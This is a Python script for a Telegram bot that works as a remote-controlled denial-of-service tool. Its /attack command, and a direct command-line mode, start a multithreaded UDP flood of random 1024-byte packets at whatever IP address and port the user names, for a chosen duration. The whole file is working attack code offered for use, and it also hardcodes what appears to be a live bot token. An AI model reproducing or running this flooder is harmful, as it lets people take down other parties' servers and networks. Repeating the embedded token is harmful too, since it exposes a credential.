import socket
import random
import threading
import sys
import time
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, ContextTypes

# Replace 'YOUR_BOT_TOKEN' with your actual bot token obtained from BotFather
TOKEN = '7436205015:AAHORqZlAWEH3VugtD6uEMEK6nIHM7zMitw'

# Global variable to control DDoS attack
stop_ddos = False

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        keyboard = [[InlineKeyboardButton("/help", callback_data='help')]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text('Hello! I am your Telegram bot.', reply_markup=reply_markup)
    except Exception as e:
        print(f"Error in start command: {e}")

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        help_text = """
        Hello! I am your Telegram bot.
        
        Here are the commands you can use:
        /start - Start the bot and get a welcome message.
        /help - Get help on how to use the bot.
        /attack <ip> <port> <timeout> <threads> - Start a DDoS attack on the specified server using UDP.
        /stop - Stop the ongoing DDoS attack.
        """
        await update.message.reply_text(help_text)
    except Exception as e:
        print(f"Error in help command: {e}")

async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global stop_ddos
    try:
        args = context.args
        if len(args) != 4:
            await update.message.reply_text("Usage: /attack <ip> <port> <timeout> <threads>")
            return
        
        target_ip = str(args[0])
        target_port = int(args[1])
        timeout = float(args[2])
        threads = int(args[3])
        
        await update.message.reply_text(f"Starting DDoS attack on {target_ip}:{target_port} with {threads} threads for {timeout} seconds.")
        stop_ddos = False
        threading.Thread(target=start_ddos, args=(target_ip, target_port, timeout, threads)).start()
    except Exception as e:
        await update.message.reply_text(f"Error: {e}")

async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global stop_ddos
    try:
        stop_ddos = True
        await update.message.reply_text("Stopping the DDoS attack...")
    except Exception as e:
        print(f"Error in stop command: {e}")

async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        query = update.callback_query
        await query.answer()

        if query.data == 'help':
            await help_command(update, context)
    except Exception as e:
        print(f"Error in button callback: {e}")

def main():
    try:
        application = ApplicationBuilder().token(TOKEN).build()

        application.add_handler(CommandHandler("start", start))
        application.add_handler(CommandHandler("help", help_command))
        application.add_handler(CommandHandler("attack", attack_command))
        application.add_handler(CommandHandler("stop", stop_command))
        application.add_handler(CallbackQueryHandler(button))

        application.run_polling()
    except Exception as e:
        print(f"Error in main: {e}")

def start_ddos(target_ip, target_port, timeout, threads):
    global stop_ddos
    try:
        timeout = time.time() + timeout
        print(f"\n[+] Starting DDoS attack on {target_ip}:{target_port} for {timeout} seconds with {threads} threads")

        def attack():
            try:
                bytes_data = random._urandom(1024)
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                while time.time() < timeout and not stop_ddos:
                    sock.sendto(bytes_data, (target_ip, target_port))
            except Exception as e:
                print(f"Error during attack: {e}")

        threads_list = []
        for _ in range(threads):
            t = threading.Thread(target=attack)
            t.start()
            threads_list.append(t)

        # Wait for all threads to complete or stop signal
        for t in threads_list:
            t.join()

        print("\n[+] Attack Finished")
    except Exception as e:
        print(f"Error in start_ddos: {e}")

if __name__ == '__main__':
    try:
        if len(sys.argv) > 1:
            target_ip = str(sys.argv[1])
            target_port = int(sys.argv[2])
            timeout = float(sys.argv[3])
            threads = int(sys.argv[4])
            start_ddos(target_ip, target_port, timeout, threads)
        else:
            main()
    except Exception as e:
        print(f"Error in __main__: {e}")
